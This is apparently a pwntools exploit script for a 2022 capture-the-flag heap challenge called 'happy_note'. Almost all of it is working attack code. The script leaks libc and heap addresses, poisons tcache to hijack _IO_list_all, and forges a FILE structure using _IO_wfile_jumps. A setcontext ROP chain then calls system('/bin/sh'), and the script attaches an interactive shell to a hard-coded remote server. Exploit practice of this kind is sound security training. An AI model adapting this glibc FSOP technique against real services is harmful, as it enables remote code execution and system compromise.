# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './happy_note'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '39.107.137.85'
    port = '44022'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>>',num)

def add( idx ,  size ,mode =1):
    cmd(1)
    sla('size:' , size)
    sla('note:' , idx)
    sla('mode:' , mode)

def edit(idx , text):
    cmd(4)
    sla('note:' , idx)
    sa('content:' , text)

def show(idx ):
    cmd(3)
    sla('show?' , idx)

def delete(idx ):
    cmd(2)
    sla('note:' , idx)

def backdoor(idx ):
    cmd(666)
    sla('note:' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _flags2 = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno) + \
        p32(_flags2)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

def attack():
    
    for i in range(8):
        add(i , 0x1f8)

    for i in range(7):
        delete(7-i)

    backdoor(0)
    show(0)

    libc.address =  l64() - 0x219cc0
    libc_base =  libc.address
    _IO_list_all = libc.sym['_IO_list_all']
    system_addr = libc.sym['system']
    binsh_addr = libc.search('/bin/sh').next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    setcontext = libc.sym['setcontext']

    # dbg()
    add( 1 ,0x18)
    delete(1)

    show(0)
    ru('content: ')
    key = uu64(5)
    heap_base = key << 12
    lg('heap_base',heap_base)

    add(1 , 0x18)
    delete(1)

    lg('libc.address',libc.address)
    lg('_IO_list_all' , _IO_list_all)
    edit(0 , flat(key , 0 , 0 ,0x21 , key ^ _IO_list_all))

    # dbg()

    add(2 , 0x18 ,2)
    add(3 , 0x18 , 2)

    edit(3 , p64(heap_base + 0x12a0))
    add(4 , 0x200)

    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _lock = libc_base + 0x21ba40

    fake_io_addr = heap_base + 0x12a0

    file = pack_file(
        _flags = 0,
        _lock = _lock,
        _IO_write_ptr = 0xa81,
        _wide_data = fake_io_addr + 0xe0 ,
    ) + p64(_IO_wfile_jumps)
    
    
    payload = p64(fake_io_addr + 0xe8)+'\x00'*0x98
    payload += flat(fake_io_addr + 0xe0*2+0x10 , pop_rdi_ret )
    payload += '\x00'*0x30
    payload += p64(fake_io_addr + 0xe0*2-0x68+8)
    payload += flat(
        setcontext+61,binsh_addr,pop_rdi_ret+1,system_addr
    )

    edit(4 ,file+ payload)
    
    # dbg('_IO_wfile_overflow')
    delete(8)
    
    p.interactive()

attack()

'''
@File    :   happy_note.py
@Time    :   2022/08/17 16:08:30
@Author  :   Niyah 
'''